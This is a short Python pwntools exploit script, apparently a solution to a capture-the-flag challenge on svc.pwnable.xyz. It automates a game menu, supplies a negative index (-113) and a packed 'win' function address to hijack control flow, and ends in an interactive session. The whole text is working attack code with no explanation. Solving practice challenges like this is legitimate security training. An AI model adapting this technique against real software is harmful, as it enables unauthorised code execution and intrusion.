from pwn import *
debug = 0

def playing_game():
    pan = r.recvuntil(' : ')
    print pan[-9:]
    while (pan[-9:] != '(y/n)? : '):
        temp1 = "use : "
        temp2 = "on : "
        print pan[-6:]
        if (pan[-6:] ==  temp1):
            r.sendline('1')
        elif (pan[-5:] == temp2):
            r.sendline('0')
        pan = r.recvuntil(' : ')


if not debug:
    r = remote('svc.pwnable.xyz', 30020)
else:
    r = process('./challenge')

win_addr = p64(0x401372)

playing_game()
r.sendline('n')
playing_game()
r.sendline('y')

r.sendlineafter('equip: ', win_addr)
r.sendlineafter('(y/n)? : ', 'y')
r.sendlineafter('exit): ', '0')
r.sendlineafter('Attack): ', '-113')
r.sendlineafter('exit): ', '3')
r.sendlineafter('use : ', '0')
r.sendlineafter('on : ', '0')
r.interactive()


